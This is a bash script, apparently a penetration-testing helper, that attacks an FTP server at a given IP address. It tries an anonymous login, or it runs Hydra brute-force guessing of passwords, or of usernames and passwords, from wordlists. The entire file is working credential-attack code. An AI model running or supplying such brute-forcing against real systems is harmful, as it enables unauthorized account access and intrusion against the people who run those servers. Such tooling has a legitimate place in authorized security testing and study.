#!/bin/bash

# Usage: ./ftp.sh <IP_ADDRESS> <choice>
if [ -z "$1" ] || [ -z "$2" ]; then
  echo "Usage: $0 <IP address> <choice>"
  echo "Choice options: 1- Anonymous login only, 2- Password breaking, 3- Username and password breaking"
  exit 1
fi

OUTPUT_DIR="scan_results"
TEXT_OUTPUT="$OUTPUT_DIR/ftp.txt"
IP_ADDRESS=$1
CHOICE=$2
WORDLIST="/path/to/wordlist.txt"  # Path to your wordlist file

# Create a directory to store results
mkdir -p $OUTPUT_DIR

if [ "$CHOICE" == "1" ]; then
  # Attempt anonymous FTP login
  echo "Attempting anonymous FTP login to $IP_ADDRESS..."
  ftp -nv $IP_ADDRESS << EOF > $TEXT_OUTPUT
user anonymous anonymous
quit
EOF

  # Check if the login was successful
  if grep -q "Login successful" $TEXT_OUTPUT; then
    echo "Anonymous FTP login to $IP_ADDRESS succeeded!"
  else
    echo "Anonymous FTP login to $IP_ADDRESS failed."
  fi

elif [ "$CHOICE" == "2" ]; then
  # Ask for the username and perform password brute-forcing with Hydra
  read -p "Enter the username for password breaking: " username
  echo "Starting password breaking for username $username on FTP..."

  # Using Hydra to perform password brute-forcing
  hydra -l $username -P $WORDLIST ftp://$IP_ADDRESS -vV

elif [ "$CHOICE" == "3" ]; then
  # Perform both username and password brute-forcing with Hydra
  echo "Starting username and password brute-forcing on FTP..."

  # Using Hydra to brute force both username and password
  hydra -L /path/to/userlist.txt -P $WORDLIST ftp://$IP_ADDRESS -vV

else
  echo "Invalid choice! Exiting..."
  exit 1
fi

# Clean up
rm $TEXT_OUTPUT
